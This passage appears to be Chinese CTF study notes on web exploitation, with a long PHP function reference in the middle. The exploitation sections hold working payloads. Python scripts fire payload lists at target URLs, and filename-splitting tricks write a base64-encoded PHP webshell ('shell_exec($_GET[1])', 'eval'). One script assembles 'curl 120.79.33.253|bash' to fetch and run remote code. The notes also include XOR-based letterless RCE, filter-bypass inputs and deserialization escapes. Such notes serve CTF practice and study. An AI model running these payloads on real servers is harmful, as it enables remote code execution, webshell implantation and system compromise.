    *v    （等同于命令：rev v）

    ----------------------------------------------

    #需要 0> t- sl这样的顺序，但是创建对应名文件后ls，出现了`0>` sl t-这样的顺序，也就是说t-到后面了，那么可以用ls 的h参数也加上去，就变成了 '0>' ht- ls

    >0\>
    >ht-
    >sl

    ---------------------------------------------

    用dir代替ls可以将内容不换行输出到指定文件中

    ls > a 后的内容都是每行一个文件名
    dir> a 之后的内容都是位于同一行的

    ```


* 快速请求脚本

    ```python
    
    #!/usr/bin/python
    # -*- coding: UTF-8 -*-
    
    import requests
    
    url = "http://192.168.61.157/rce.php?1={0}"
    print("[+]start attack!!!")
    with open("payload.txt","r") as f:
        for i in f:
            print("[*]" + url.format(i.strip()))
            requests.get(url.format(i.strip()))
    
    #检查是否攻击成功
    test = requests.get("http://192.168.61.157/1.php")
    if test.status_code == requests.codes.ok:
        print("[*]Attack success!!!")


    ```

    ```python

    #!/usr/bin/python
    # -*- coding: UTF-8 -*-
    import requests
    import threading
    lock = threading.Lock()
    def exp():
        lock.acquire(True) #锁定
        url = "http://192.168.12.107/4/index.php?cmd={0}"
        print("[+]start attack!!!")
        with open("payload.txt","r") as f:
            for i in f:
                print("[*]" + url.format(i.strip()))
                requests.get(url.format(i.strip()))
                #检查是 否攻击成功
        test = requests.get("http://192.168.12.107/4/sandbox/2ad26c4b0f3cdead3c4c1955ad805b8d/1.php")
        if test.status_code == requests.codes.ok:
            print("[*]Attack success!!!")
        lock.release() #释放

    if __name__ == '__main__':
        t = threading.Thread(target=exp)
        t.start()


    ```


* 15字符限制

    ```php



    ```

* 8字符限制

    ```php
    
    >a "在linux中会直接创建这个文件，但没有内容"
    ls -t "将目录中的文件以时间顺序排列，最后创建的排在第一位"
    sh a "将文件a中的所有内容以命令执行"
    who/
    am/
    i "Linux中的命令拼接符/会将命令按照whoami执行"

    ```

    要构造的内容

    ```php

    echo <?php echo shell_exec($_GET[1]); >1.php "便于查看回显"
    echo PD9waHAgZWNobyBzaGVsbF9leGVjKCRfR0VUWzFdKTs=|base64 -d>1.php "使用base64的方式避免$等特殊字符输入失败"

    ```

    思路：

    * 使用`>`符号将要构造的内容分段创建，要从命令的后面往前创建
    
    * 然后再使用ls -t会对创建的文件进行排序
    
    * `ls -t >a`就可以将目录下所有文件名拼接输入到文件a中

    * `sh a`会将a中的内容以shell脚本形式执行

    ```php

    //payload，里面的\要进行转义的，为了变成反斜杠字符传到a中，以后执行的时候就会变为换行符
    >hp
    >1.p\\
    >d\>\\
    >\ -\\
    >64\ \\
    >base\\
    >\=\|\\
    >dKTs\\
    >UWzF\\
    >fR0V\\
    >jKCR\\
    >leGV\\
    >sbF9\\
    >zaGV\\
    >obyB\\
    >gZWN\\
    >waHA\\
    >PD9\\
    >o\ \\
    >ech\\
    ls -t>0
    sh 0

    ```

* 7字符RCE

    同8字符，只是写入shell的时候减一个字母

    ```php

    #写入语句
    <?php eval($_GET[1]);
    #base64编码后
    PD9waHAgZXZhbCgkX0dFVFsxXSk7
    #需要被执行的语句：
    echo PD9waHAgZXZhbCgkX0dFVFsxXSk7|base64 -d>1.php

    ```

    ```php

    >hp
    >1.p\\
    >d\>\\
    >\ -\\
    >e64\\
    >bas\\
    >7\|\\
    >XSk\\
    >Fsx\\
    >dFV\\
    >kX0\\
    >bCg\\
    >XZh\\
    >AgZ\\
    >waH\\
    >PD9\\
    >o\ \\
    >ech\\
    ls -t>0
    sh 0

    ```


* 5字符RCE

    目的：echo${IFS}PD9waHAgZXZhbCgkX0dFVFsxXSk7|base64 ‐d>1.php

    使用dir可以不换行将当前目录下文件名输出

    ```php

    >dir
    >f\>
    >ht-
    >sl
    *>v
    >rev
    *v>0
    >a
    >hp
    >p\\
    >1.\\
    >\>\\
    >-d\\
    >\ \\
    >64\\
    >se\\
    >ba\\
    >\|\\
    >7\\
    >Sk\\
    >X\\
    >x\\
    >Fs\\
    >FV\\
    >d\\
    >X0\\
    >k\\
    >g\\
    >bC\\
    >h\\
    >XZ\\
    >gZ\\
    >A\\
    >aH\\
    >w\\
    >D9\\
    >P\\
    >S}\\
    >IF\\
    >{\\
    >\$\\
    >o\\
    >ch\\
    >e\\
    sh 0
    sh f 

    ```

    ```python

    #encoding:utf-8
    import requests
    baseurl = "http://120.79.33.253:9003/?cmd="
    reset = "http://120.79.33.253:9003/?reset"
    s = requests.session()
    s.get(reset)
    # 将ls -t 写入文件_
    list=[
        ">ls\\",
        "ls>_",
        ">\ \\",
        ">-t\\",
        ">\>y",
        "ls>>_"
    ]
    # curl 120.79.33.253|bash
    list2=[
        ">bash",
        ">\|\\",
        ">53\\",
        ">2\\",
        ">3.\\",
        ">3\\",
        ">9.\\",
        ">7\\",
        ">0.\\",
        ">12\\",
        ">\ \\",
        ">rl\\",
        ">cu\\"
    ]
    for i in list:
        url = baseurl+str(i)
        s.get(url)
    for j in list2:
        url = baseurl+str(j)
        s.get(url)
    s.get(baseurl+"sh _")
    s.get(baseurl+"sh y")
    #s.get(reset)


    ```

* 4字符RCE

    ```php
    >dir
    >f\>
    >ht-
    >sl
    *>v
    >rev
    *v>a
    >hp
    >p\
    >1.\
    >\>\
    >-d\
    >\ \
    >64\
    >se\
    >ba\
    >\|\
    >7\
    >Sk\
    >X\
    >x\
    >Fs\
    >FV\
    >d\
    >X0\
    >k\
    >g\
    >bC\
    >h\
    >XZ\
    >gZ\
    >A\
    >aH\
    >w\
    >D9\
    >P\\
    >S}\
    >IF\
    >{\
    >\$\
    >o\
    >ch\
    >e\
    sh a
    sh f

    ```


* 3字符

    本地搜索`有限字符下的任意命令执行总结`

    题目来源
    
    ```php

    //这个知识点来自CTFSHOW平台的【nl】难了 一题

    <?php
    show_source(__FILE__);
    error_reporting(0);
    if(strlen($_GET[1])<4){
        echo shell_exec($_GET[1]);
    }
    else{
        echo "hack!!!";
    }
    ?>


    ```

    ```php

    只限3个字符的shell_exec，依然利用通配符 * 表示将ls下面的文件执行，如果第一个是命令就直接执行命令，后面的当参数，与前几点的原理类似

    首先ls查看当前目录下有哪些文件  ?1=ls

    只存在s开头的和z开头的文件，Linux中文件排序按照26个英文字母顺序排放，所以我们依然利用前几种字符限制的方法，通过>写入一个以命令名命名的文件，如:nl（读取文件带上行）od（八进制显示输出），但这样的命令前提是其第一个字母必须在当前文件名中排到第一位。

    payload:?1=>nl ?1=*或?1=*>z 第二种：?1=>od ?1=*

    接下来再传入?=*的时候就会在源代码中得到flag。


    ```
    
    
## 模糊测试

```php
|
||
&&
&
;
>
>>
<
{
}
${IFS}
$IFS
'
"
,
%0d
%0c
%09
%0a
%0b
cat
tac
more
tail
head
nl
od
 123(这是空格)
\123(这是在检测\符号，防止linux收到\之后一直等待)

```

# 无字母RCE

## 位运算`异或RCE`

找到两个非字母的字符，使得两者二进制异或之后变为对应字母就可，将它们连接起来然后传进去okk

异或运算，二进制字符进行比较，相同返回`0`，不同返回`1`
```php
<?php
$_=('%01'^'`').('%13'^'`').('%13'^'`').('%05'^'`').('%12'^'`').('%14'^'`'); // $_='assert';
$__='_'.('%0D'^']').('%2F'^'`').('%0E'^']').('%09'^']'); // $__='_POST';
$___=$$__;
$_($___[_]); // assert($_POST[_]);
```


## 位运算`取反RCE`

>[极客大挑战 2019]RCE ME

利用`UTF-8`编码中的某个汉字，将其中的某个字符提取出来，比如`'和'{2}`的结果是`\x8c`，其取反为字母`s`


## `$(())`数学运算(适用于多种进制)

```php
$(())=0
~$(())=~0 #取反
$((~$(())))=-1 #对-0进行数学运算

$((~$(($((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(()))))))) #36 先对零取反再运算得-1，36个-1相加再取反得36

```

## 页面构造

构造上传文件页面，php不能判断这个页面之后还会不会用到，就会先保留在临时目录下 `/tmp/phpxxxxxX(五个小写字母一个大写字母)`

## linux cmd命令正则

* linux下'\'可以用在命令行中，用在行尾可以换行并连接上一行命令尾部，也就是起换行的作用，但是命令不会中断，所以可以用来绕过完整匹配模式的正则匹配

# PHP字符串解析漏洞

PHP会将URL或者body中的查询字符关联到$_GET或者$_PSOT，例如`?num=asd`代表`Array([num]=>"asd")`,但是查询字符串在解析的过程中会将某些字符删除或者用下划线代替，例如`?%20num[01=asd`代表着`Array([num_01]=>"asd")`，其中空格被删去并且中括号被替换成了下划线，利用这一点就可以对防火墙检测策略进行绕过。

如果检测的是页面GET的`num`变量，但是传值传的是`%20num`，在检测过程中找不到`num`变量，但是在解析过程中PHP依旧会将`%20num`值赋给`num`，从而达到绕过检测并传递非法值的目的。



# PHP常见函数
>内容参见[php常用的系统函数大全](https://www.cnblogs.com/phper12580/p/10395374.html)

***
## 字符串函数
|函数|描述|
|:-:|:-:|
var_dump    |判断一个变量的类型与长度，如果变量有值就输出变量的类型与值
strlen      |获取字符串长度，字节长度
substr_count|某字符串出现的次数
substr      |字符串截取，获取字符串（按照字节进行截取）
mb_strlen
mb_substr
strchr      |与substr相似，从指定位置截取一直到最后
strrchr(获取文件后缀)|与strchr一样，只是从右边开始查找字符
strtolower  |所有的字符都小写（针对英文字母）
strtoupper  |所有的字符都大写
strrev      |字符串反转（只能反转英文：英文存储只有一个字节），按照字节进行反转
strpos      |从字符串中找对应字符出现的位置（数字下标），从最左边开始找
strrpos     |与strpos一样，只是从字符串的右边开始找
trim        |去掉函数两边的字符，默认是空格
str_split   |函数把字符串分割到数组中。
chunk_split()|函数把字符串分割为一连串更小的部分
str_repeat("Shanghai",5)|把字符串 "Shanghai " 重复 5 次
str_replace('\\','/',dirname(DIR)))|替换
ucfirst     |首字母大写
***
## 时间日期函数
|函数|描述|
|:-:|:-:|
time        |得到当前时间的时间戳（整型：从格林威治时间1970年1月1日0时0分0秒开始）秒数
date|时间序列化函数，将指定的时间戳转换成规定时间日期的显示格式（随意的字符串：有专业的格式符规定），如果没有指定时间戳，系统默认使用当前时间的时间戳
strtotime   |时间日期格式的字符串转换成对应的时间戳（只要是正确的英语时间表达方式，都可以进行转换）
microtime   |微秒时间戳，根据不同的要求返回不同的结果 混合 microtime (布尔类型 )，可以返回一个浮点数的时间，也可以返回一个数组（时间戳和微秒数）
***
## 数学相关函数
|函数|描述|
|:-:|:-:|
abs     |绝对值
floor   |向下取整 floor(3.2) 结果等于3
ceil    |向上取整
round   |四舍五入
rand    |取得一个指定范围内的随机整数
mt_rand |取得一个指定范围内的随机整数（效率更高）
min     |PHP 会将非数值的 string 当成 0，但如果这个正是最小的数值则仍然会返回一个字符串。如果多个参数都求值为 0 且是最小值，min() 会返回按字母表顺序最小的字符串，如果其中没有字符串的话，则返回数值的 0;
max     |PHP 会将非数值的字符串当成 0，但如果这个正是最大的数值则仍然会返回一个字符串。如果多个参数都求值为 0 且是最大值，max() 会返回其中数值的 0，如果参数中没有数值的 0，则返回按字母表顺序最大的字符串。对于多个数组,max从左到右比较;如果同时出现数组和非数组参数总把数组作为最大值返回;

***
## 数组相关函数

|函数|描述|
|:-:|:-:|
count() // 非数组返回1
key         |获取当前数组当前指针所指向的元素的下标
current     |获取的当前指针指向元素的数值
next        |获取下一个元素的值，并且将指针下移
prev        |获取上一个元素的值，并且将指针上移
end         |将指针移到数组的最后一个元素，并返回最终指针位置的值
reset       |将指针移到数组的第一个元素，返回最终指针位置的值
array_keys  |获取一个数组的所有键名，返回一个索引数组
array_values|获取一个数组的所有值，返回一个索引数组
explode     |爆炸，将一个字符串按照某个指定的规则（通常是特殊字符），将数组分成多个段，每一段都当做一个数组的元素，返回一个索引数组
split       |类似 explode explode('.', 'abc.txt')等于split('\.','abc.txt')
implode     |粘合，将一个数组内部的所有元素按照某个指定的规则（特殊字符），将所有的元素拼接成一个字符串
join()      | 把数组元素组合为一个字符串
array_merge |合并，指的是将两个数组中的元素进行累计。如果后面的数组与前面的数组有下标（键名：关联）相同的，那么后面的元素的值会覆盖前面的；如果是索引的相同下标，会自动的修改下标叠加到前面的数组里。
array_reverse| 返回反转后的数组,也就是说原来数组倒数第二个元素变为正数第二个元素
array_flip  |交换数组中的键和值
数据结构模拟函数#
array_shift |从数组的前面弹出元素，得到元素的值
array_pop   |从数组的后面弹出元素，获得元素的值
array_unshift|从数组的前面压入元素，得到当前数组元素的个数
array_push  |从数组的后面压入元素，得到当前数组元素的个数

***
## 判断变量
|函数|描述|
|:-:|:-:|
is_bool     |判断是否是布尔类型
is_float    |判断浮点型
is_integer  |判断整型
is_object   |判断对象
is_array    |判断数组
is_string   |判断字符串
is_resource |判断资源
is_scalar   |scalar是标量的，判断是基本数据类型：整型，浮点型，布尔型和字符串型
is_null     |检测变量是否为NULL 是返回TRUE 否则返回false。1.被赋值为NULL;2.变量没被赋值;3.被unset()
is_numeric  |判断数字或者纯数字组成的字符串
gettype     |获得数据类型
settype     |改变数据类型
isset
unset()     |如果在函数中 unset() 一个全局变量，则只是局部变量被销毁，而在调用环境中的变量将保持调用 unset() 之前一样的值,如果在函数中 unset()     |一个通过引用传递的变量，则只是局部变量被销毁，而在调用环境中的变量将保持调用 unset() 之前一样的值。
empty       |array(),"",0,"0",NULL,FALSE 都返回true

***
## 文件操作函数(重要！！)
|函数|描述|
|:-:|:-:|
opendir(路径)       |打开一个路径资源（将路径内部的所有数据读入到内存）
readdir(路径资源)   |从文件夹资源中读取当前资源指针所指向的文件的名字，指针会向下移动一位
closedir(资源)      |释放对应的文件资源
scandir(路径)       |读取一个路径内部的所有文件名，返回一个数组，数组的每一个元素都是文件名。
file_exists         |判断一个文件是否存在（文件是广义：路径和文件）
is_dir              |判断一个指定路径是否存在（文件夹）
is_file             |判断一个指定路径是否是文件（文件）
mkdir               |创建一个路径，如果路径存在就会报错
rmdir               |移除文件夹
file_get_contents   |从一个指定的文件内读取数据内容。
file_put_contents   |将指定的字符串写入到对应的文件
fopen               |打开一个文件资源
fgetc               |c代表character，一次读取一个字符
fgets               |s代表string，代表可以读取多个字符，取决于指定的读取长度或者是否碰到换行（最多只能读取一行数据）
两个函数都是对当前资源指针进行操作，读取之后都会将指针下移
fread               |获取指定长度的数据直到文件结束
fwrite              |向文件资源指针所在的位置写入数据，写东西不会将当前位置已有的东西往后移，而是会覆盖
fseek               |将指针指定到对应的位置
fclose              |使用对应的文件资源
copy                |复制
unlink              |删除文件
rename              |重命名文件
filemtime           |m代表modify，文件最后被修改的时间
filesize            |文件大小（字节）
fileperms           |文件权限（Linux下的八进制）

***
## 排序
|函数|描述|
|:-:|:-:|
rsort()     |函数用于对数组单元从高到低进行排序。
asort()     |函数用于对数组单元从低到高进行排序并保持索引关系。
arsort()    |函数用于对数组单元从高到低进行排序并保持索引关系。
ksort()     |函数用于对数组单元按照键名从低到高进行排序。
krsort()    |函数用于对数组单元按照键名从高到低进行排序。
## 报错
|函数|描述|
|:-:|:-:|
error_reporting(E_ALL)
ini_set('display_errors', 1)

***
## 常量
|函数|描述|
|:-:|:-:|
define() 定义常量
defined() 检测常量是否定义

***
## 序列化
|函数|描述|
|:-:|:-:|
serialize
unserialize
json_encode|对变量进行 JSON 编码
json_decode|对JSON 格式的字符串进行编码

***
## 编码

base64_encode 编码

本函数将字符串以 MIME BASE64 编码。在 BASE64 编码后的字符串只包含英文字母大小写、阿拉伯数字、加号与反斜线，共 64 个基本字符，不包含其它特殊的字符，因而才取名 BASE64。

base64_decode 解码

# PHP特性
## 短标签


* `<? echo '123';?>`
前提是开启配置参数short_open_tags=on

* `<?=(表达式)?>  等价于 <?php echo (表达式)?>`
不需要开启参数设置

* `<% echo '123';%>`
前提是开启配置参数asp_tags=on，经过测试发现7.0及以上修改完之后也不能使用，而是报500错误，但是7.0以下版本在修改完配置后就可以使用了

* `<script language=”php”>echo '123'; </script>`
不需要修改参数开关，但是只能在7.0以下可用。

# 松散比较
>[PHP 类型比较表](https://www.php.net/manual/zh/types.comparisons.php)

当字符串与数字类型进行比较的时候，会将字符串转换为数字类型再进行比较

 `123=='123a'`

* intval() 返回参数整数值


## 函数绕过

### strcmp()
strcmp()函数的作用是比较两个字符串

如果 str1 小于 str2 返回 < 0；如果 str1 大于 str2 返回 > 0；如果两者相等，返回 0

strcmp函数无法比较数组，返回0，判断结果为相等

### intval()
>通过使用指定的进制 base 转换（默认是十进制），返回变量 value 的 int 数值。 intval() 不能用于 object，否则会产生 E_NOTICE 错误并返回 1。

数组是对象，可以通过传数组判断方法

>成功时返回 var 的 integer 值，失败时返回 0。 空的 array 返回 0，非空的 array 返回 1。
>intval(mixed $value, int $base = 10): int//要转换成 integer 的数量值,转化所使用的进制
>如果 base 是 0，通过检测 value 的格式来决定使用的进制：

>如果字符串包括了 "0x" (或 "0X") 的前缀，使用 16 进制 (hex)；否则，如果字符串以 "0" 开始，使用 8 进制(octal)；否则，将使用 10 进制 (decimal)。

```php
echo intval(42);                      // 42
echo intval(4.2);                     // 4
echo intval('42');                    // 42
echo intval('+42');                   // 42
echo intval('-42');                   // -42
echo intval(042);                     // 34
echo intval('042');                   // 42
echo intval(1e10);                    // 1410065408
echo intval('1e10');                  // 1
echo intval(0x1A);                    // 26
echo intval(42000000);                // 42000000
echo intval(420000000000000000000);   // 0
echo intval('420000000000000000000'); // 2147483647
echo intval(42, 8);                   // 42
echo intval('42', 8);                 // 34
echo intval(array());                 // 0
echo intval(array('foo', 'bar'));     // 1
```
>intval()函数如果$base为0则$var中存在字母的话遇到字母就停止读取 但是e这个字母比较特殊，可以在PHP中不是科学计数法。所以为了绕过前面的==4476我们就可以构造 4476e123 其实不需要是e其他的字母也可以

>intval对加号或者空格开头的数字会自动进行去空处理

* 绕过

    1.传num=4476a
    2.利用进制特点，传八进制或者十六进制数据(八进制以0开头，十六进制以0x开头，别忘加)
    3.intval会去空处理，可以在值前面加空

### 大小比较

* 当一个数字与一个字符串/字符进行大小比较时，首先系统尝试将此字符串/字符转换为整型/浮点型，然后进行比较
    
### is_numeric
判断参数是否为数字，数字前加(空)可以绕过
常用空字符
```php
%20---普通空格
%09---制表符
%0a---换行符
%0d---回车符
%00---空字节符
%0B---垂直制表符
以上是trim()函数去除的
%0c---换页符
```
### preg_match

preg_match只能处理字符串，当传入的subject是数组时会返回false

正则匹配，有正则溢出
250000次

preg_match未开启多行模式/m的话只会去匹配第一行，可以用多行进行绕过，且符号'.'匹配不到换行符

`%0Axxxxxxxxx%0A`

### basename

>[basename()绕过小结](https://www.cnblogs.com/yesec/p/15429527.html)

>[Zer0pts2020]Can you guess it?

`basename()`函数返回路径中的文件名部分。

在使用默认语言环境设置时，basename() 会删除文件名开头的非 ASCII 字符。

```php
http://localhost/?file=%ffindex.php/%ff
//index.php
http://localhost/?file=%ffindex.php
//index.php
http://localhost/?file=index.php%ff
//index.php
http://localhost/?file=index.php/%2b
//+

```

fuzz脚本

```php
<?php
highlight_file(__FILE__);
$filename = 'index.php';
for($i=0; $i<255; $i++){
    $filename = $filename.'/'.chr($i);
    if(basename($filename) === "index.php"){
        echo $i.'<br>';
    }
    $filename = 'index.php';
}

#测出来ascii值为47、128-255的字符均可以绕过basename()
#其中47对应的符号为'/'，在实际场景中没有利用价值
#那么也就是说我们可以利用一部分不可见字符来绕过basename()
#同时，在测试中也可以现中文字符也是可以绕过basename()
#例如汉字、？、《、》、；等中文字符

```


## 内置类
>利用内置类结合函数执行，可以在类创造的时候执行对应代码
### 反射类ReflectionClass
```php
echo new ReflectionClass()
可以将括号中的语句在类构建时执行
```

### 迭代器FilesystemIterator
目录迭代器
```php
v1=FilesystemIterator&v2=getcwd

```
## 变量覆盖
>(PHP中的变量覆盖漏洞)[https://www.cnblogs.com/xhds/p/12587249.html]

### `extract(array,extract_rules,prefix)`变量覆盖

>[安洵杯 2019]easy_serialize_php

extract() 函数从数组中将变量导入到当前的符号表。

该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。

该函数返回成功设置的变量数目。

当我们传入`SESSION[flag]=123`时，`$SESSION["user"]`和`$SESSION['function']` 全部会消失。

### parse_str()

parse_str() 函数把查询字符串解析到`变量中`。

>注释：如果未设置 array 参数，由该函数设置的变量将**覆盖**已存在的同名变量。

>注释：php.ini 文件中的 magic_quotes_gpc 设置影响该函数的输出。如果已启用，那么在 parse_str() 解析之前，变量会被 addslashes() 转换。

```php
extract(_POST)@parse_str($_SERVER['QUERY_STRING']);
extract($_POST);

像这种情况，如果你GET传一个_POST[]数组，那么就会覆盖原有准备`$_POST`传参的变量，也就是说，原来是需要POST传参的，但是现在被GET传的同名数组给替换了。
```

### 动态变量覆盖

```php
foreach($_GET as $key=>$value)
意思就是将get的赋值变为$key=$value
if get:a=b
也就是说($key=a)=>($value=b)
$bar= "a";
$Foo="Bar";
$World="Foo";
$Hello="world";
$a="Hello";

echo $a; //hello
echo $$a; //world
echo $$$a; //foo
echo $$$$$a; //Bar
echo $$$$$$a; //a
echo $$$$$$$a; //hello
echo $$$$$$$$a; //world
```

### parse_str(string,result)变量覆盖
>该函数将查询的字符串解析到变量中
>parse_str(string,array)
```php
parse_str("name=xiaohua&age=22");
echo $name."<br>";
echo $age;
?>
//xiaohua
//22
```
**如果 string 是 URL 传递入的查询字符串（query string），则将它解析为变量并设置到当前作用域（如果提供了 result 则会设置到该数组里 ）。**

### import_request_variables()
>(PHP 4 >= 4.1.0, PHP 5 < 5.4.0)
将 GET／POST／Cookie 变量导入到全局作用域中

`$_REQUEST`是一个存放用户POST传入和GET传入参数的数组，当GET和POST传了同名参数的时候，`$_REQUEST`更倾向于使用POST中的变量。

### register_globals()

>在PHP5.3之前 默认开启 PHP5.3默认关闭  PHP5.6及5.7已经被移除
当register_globals全局变量设置开启时，传递过来的值会被直接注册为全局变量而使用，这会造成全局变量覆盖

## 非法变量转换
PHP变量中包含`数字字母下划线`，PHP对定义的非法变量进行转换，但是在整个非法变量中只转换一次，也就是说，如果一个变量中出现两个非法字符，将只转换第一个，对第二个不进行转换。

```php

what[123.com => what_123.com #此处只对第一处非法字符进行转换，而没有转换`.`

```


# PHP反序列化

>序列化（Serialization）是指将数据结构或对象转换为一系列字节（或位）以便在网络上传输或存储到本地磁盘等介质中。通常，数据被序列化为二进制数据流或XML格式。序列化的过程包括将数据转换为单个线性字节序列的过程，存储跨不同平台和应用程序的数据。

>为方便存储、转移对象，将对象转化为字符串的操作叫做序列化；将对象转化的字符串恢复成对象的过程叫做反序列化。

>序列化与反序列化只是数据形式的变换，所以并不是只针对于定义好的类。

>$a='what';echo serialize($a);//s:5:"what?"

>对一个对象进行序列化，只是将其属性数据保存起来，但是并不保存其方法，因为方法并不是数据，做反序列化构造的时候删掉成员函数

## 序列化后格式讲解

`O:4:"info":1:{s:4:"name";i:2:"19";}`

* 开头

    `O`代表这是个object对象
    `i`代表这是个整形
    `a`代表这是数组
    `s`代表这是字符串

* 对象长度

    `4`代表对象名的长度，也就是后面`"info"`位置字符串长度

* 对象名称

    `"info"`位置记录了对象名称

* 对象中变量个数

    `2`表示这个对象中有两个变量，观察后面就可以知道

* 变量内容

    开头字符表示变量类型，`s`表示`string`类型，如果是`i`表示`int`类型，后面跟着的时变量名

* 关于protected属性和private属性

    >[反序列化漏洞](https://blog.csdn.net/qq_25981849/article/details/119654861)

    protected属性允许当前类示例和子类对其进行访问

    private属性只允许当前类实例对其进行访问

    序列化之后，二者都有不可见字符的插入

    `print_r()`是以易于理解的方式打印变量，各种格式

    `echo`只是输出字符串

    protected:`%00*%00属性名`只比实际长3个字符

    ```php

    php > class Test2{protected $name;};
    php > $b = new Test2;
    php > print_r($b);
    Test2 Object
    (
        [name:protected] => 
    )
    php > echo serialize($b);
    O:5:"Test2":1:{s:7:"*name";N;}
    php > echo urlencode(serialize($b));
    O%3A5%3A%22Test2%22%3A1%3A%7Bs%3A7%3A%22%00%2A%00name%22%3BN%3B%7D

    ```

    private:`%00类名%00属性名`多了n+2个不可见字符

    ```php
    
    php -a

    php>class Test{private $name;}
    php>$a = new Test;
    php>echo serialize($a)
    O:4:"Test":1:{s:10:"Testname";N;}//长度为8+2=10
    php > echo urlencode(serialize($a));
    O%3A4%3A%22Test%22%3A1%3A%7Bs%3A10%3A%22%00Test%00name%22%3BN%3B%7D

    ```

    绕过方法1. 可以直接将序列化后的内容进行`url全编码`
    
    绕过方法2. 高版本php7.1之后对传入的属性要求不高 因此可以把protected或者private的属性改成public进而绕过这些特殊字符

## 魔法函数

>满足一定条件自动调用的方法即为魔术方法，常见魔术方法及触发条件如下

* _wakeup()函数绕过

    unserialize()会检查是否存在一个 __wakeup() 方法。如果存在，则会先调用 __wakeup() 方法，预先准备对象需要的资源
    反序列化时，如果表示对象属性个数的值大于真实的属性个数时就会跳过__wakeup()的执行

    `5.6版本?以下`使序列化后的数据对象个数与实际不符，就可以。
    `7.4版本以上`，如果类中有__unserialize()方法的话自动绕过__wakeup()魔法函数

* 其他常见魔术方法

    unserialize() 检查具有魔术名称 __wakeup 的函数的存在。如果存在，此函数可以重建对象可能具有的任何资源。

    __construct： 在创建对象时候初始化对象，一般用于对变量赋初值。
    __destruct： 和构造函数相反，当对象所在函数调用完毕后执行。
    __toString：当对象被当做一个字符串使用时调用。
    __sleep:序列化对象之前就调用此方法(其返回需要一个数组)
    __wakeup:将在反序列化之后立即被调用，反序列化恢复对象之前调用该方法
    __call:当调用对象中不存在的方法会自动调用该方法。
    __get:在调用私有属性的时候会自动执行
    __isset()在不可访问的属性上调用isset()或empty()触发
    __unset()在不可访问的属性上使用unset()时触发
    __invoke() 将对象当作函数来使用的时候，会自动调用该方法，用“unset()”函数删除对象内部的私有成员属性时，对象会自动调用__unset()函数来帮我们删除对象内部的私有成员属性。
    __get()如果试图读取一个对象并不存在的属性的时候，PHP就会给出错误信息。如果在类里添加__get方法，并且我们可以用这个函数实现类似java中反射的各种操作。

## invoke

* 举例

    一个类Test，如果像Test()这样以函数形式调用就会执行其中的__invoke函数

## 反序列化链

>[MRCTF2020]Ezpop

>主要观察用到的魔法函数以及函数中的属性调用，通过各个类之间的联系构造一条能达成最终目的的利用链，主要是对魔法函数触发情况的考察

* 概念

    pop又称之为面向属性编程(Property-Oriented Programing)，常用于上层语言构造特定调用链的方法，与二进制利用中的面向返回编程(Return-Oriented Programing)的原理相似，都是从现有运行环境中寻找一系列的代码或者指令调用，然后根据需求构成一组连续的调用链，最终达到攻击者邪恶的目的；说的再具体一点就是 ROP 是通过栈溢出实现控制指令的执行流程，而我们的反序列化是通过控制对象的属性从而实现控制程序的执行流程，进而达成利用本身无害的代码进行有害操作的目的。

## 字符逃逸

* 增字符适用场景

    通常用于先对一个类序列化之后再进行`字符替换`，然后再进行反序列化，此时序列化中被替换后的字符串如果和其标明的长度不相符，比如标明长度为`6`,但是字符串长度却为`7`,就会造成一个字符逃逸读不到，提前寻找闭合，利用这个特性就可以构造`payload`

    ```php
    
    public $name='aaaabbbbbbb";s:4:"pass";s:6:"hacker;}";'

    ```

    只是举个例子，就构造类似这样的就行，后面的闭合有多长就要逃逸多少个字符


    >如果是以数组形式传入的话要注意将各个部分用}再分隔一次，见[0ctf2016 piapiapia]


* 减字符使用场景

    >[安洵杯 2019]easy_serialize_php

    过滤之后将原来的关键字替换为`空`，也就是说，标明长度为`6`，实际为`0`，就会继续向后读，找到长度为`6`的闭合，

    就会使原先的一些数据属性失去其作用，被包含到上一个变量之中

## 对象逃逸


## 方法引用

* call_user_func()
    
    回调函数的使用方法,数组
    ```php
    
    // Type 1: Simple callback
    call_user_func('my_callback_function'); 

    // Type 2: Static class method call
    call_user_func(array('MyClass', 'myCallbackMethod')); 

    // Type 3: Object method call
    $obj = new MyClass();
    call_user_func(array($obj, 'myCallbackMethod'));

    // Type 4: Static class method call (As of PHP 5.2.3)
    call_user_func('MyClass::myCallbackMethod');

    // Type 5: Relative static class method call (As of PHP 5.3.0)    
    ```

## 小技巧

*  换列名

    ```php
    alter table 表名 change column `原列名` `现列名` 类型(长度)/*varchar(212)*/
    ```
    将密码列与id列互换，这样select密码就是在select id，大大降低密码爆破难度，只要id和用户名对就能登录，使用堆叠注入

* `十六进制检测`

    mysql支持十六进制值查询，在数字上下文中，十六进制数如同整数(64位精度)。在字符串上下文，如同二进制字符串，每对十六进制数字被转换为一个字符

    也就是传值的时候直接 `where id = <十六进制>`

* `赋值引用`

    ```php
    
    // ctfshow 265
    $ctfshow = unserialize($_GET['ctfshow']);
    $ctfshow->token=md5(mt_rand());

    if($ctfshow->login()){
        echo $flag;
    }


    ```
* 大小写检测

    PHP内对函数不区分大小写，类也不区分大小写，只有变量名区分


    出现这样强制修改值的题，就用引用变量的方法，使两块变量的空间地址一样，这样一改就导致两个值都变化，等式恒成立

    ```php

    $this->token='a';
    $this->password =&$this->token;

    ```


# JAVA反序列化

>java反序列化和php的稍微有些不同

>java靶场-->[WebGoat](https://github.com/WebGoat/WebGoat)

## 方法

* 序列化

    `Java.ObjectOutputStream`类-->`writeObject()`
    
    该方法对参数指定的obj对象进行序列化，把字节序列写到一个目标输出流中，按Java的标准约定是给文件一个`.ser`扩展名

* 反序列化

    `Java.io.ObjectInputStream`类-->`readObject()`

    该方法从一个源输入流中读取字节序列，再把它们反序列化为一个对象，并将其返回

## 工具


* `ysoserial`

    ysoserial是一个反序列化工具:集成了各种反序列化payload

    1.构造（可以使用ysoserial）可执行命令的序列化对象
    2.作为一个消息，发送给目标61616端口
